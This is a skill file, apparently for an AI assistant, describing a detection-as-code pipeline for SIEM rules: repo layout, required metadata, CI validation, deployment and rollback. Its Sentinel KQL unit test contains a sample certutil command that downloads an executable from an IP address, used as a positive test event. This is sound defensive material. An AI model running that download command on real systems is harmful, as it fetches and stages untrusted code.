---
name: detection-as-code
description: Manage detections as code — Git repository layout, rule schema and metadata, CI validation (sigma check, unit tests with sample events), peer review, automated deployment to SIEM via API/Terraform, versioning and rollback. Use when setting up a detection engineering pipeline, reviewing a detection repo, or moving from console-edited rules to version control.
license: MIT
metadata:
  category: detection-engineering
  version: "2.0.0"
  verification: documented
---

# Detection as Code

## Repository layout

```
detections/
  rules/<platform-or-sigma>/<tactic>/<rule>.yml
  tests/<rule-id>/{positive.json,negative.json}
  pipelines/corp_mapping.yml
  lookups/allowlists/*.csv          # exclusions with owner + expiry columns
  docs/ads/<rule-id>.md             # ADS documentation
  .github/workflows/ci.yml
```

## Required rule metadata

`id`, `title`, `status`, `owner`, `ATT&CK tags`, `severity`, `data sources`, `false positives`, `runbook link`, `created/modified`, `test case IDs`. Enforce with a schema check in CI.

## CI pipeline stages

1. Lint/schema: `sigma check rules/`, yamllint, custom metadata checks (owner present, runbook exists, unique IDs).
2. Convert: `sigma convert` per target; fail on unmapped fields.
3. Unit test: evaluate the rule against `positive.json` (must match) and `negative.json` (must not) — e.g. with a local evaluator, Splunk `| makeresults`-based tests, Sentinel `datatable()` tests, or Elastic's detection-rules test harness.
4. Peer review via pull request (two-person rule for production detections).
5. Deploy on merge via API/IaC: Splunk REST (`saved/searches`), Sentinel (`Microsoft.SecurityInsights/alertRules` via ARM/Bicep/Terraform `azurerm_sentinel_alert_rule_scheduled`), Elastic `detection-rules` CLI (`kibana import-rules`), Chronicle/SecOps APIs.
6. Post-deploy smoke test: confirm rule enabled and scheduled; synthetic test event if available.

## KQL unit test pattern (Sentinel)

```kusto
let DeviceProcessEvents = datatable(FileName:string, ProcessCommandLine:string)
[ "certutil.exe", "certutil -urlcache -split -f http://198.51.100.1/a.exe a.exe",
  "certutil.exe", "certutil -verify cert.cer" ];
DeviceProcessEvents
| where FileName =~ "certutil.exe" and ProcessCommandLine has "urlcache" and ProcessCommandLine has "http"
| count   // expect 1
```

## Controls

- Production rule changes only through the pipeline (lock console editing via RBAC or detect drift by comparing deployed rules to repo nightly).
- Tag releases; rollback = redeploy previous tag.
- Exclusion lookups also go through PR with expiry.

## Related skills

`sigma-conversion`, `detection-testing`, `detection-lifecycle`, `alert-tuning`

## References

- Elastic detection-rules repo (DaC reference implementation): https://github.com/elastic/detection-rules
- Splunk security_content (ESCU) repo: https://github.com/splunk/security_content
- Terraform azurerm_sentinel_alert_rule_scheduled: https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/sentinel_alert_rule_scheduled
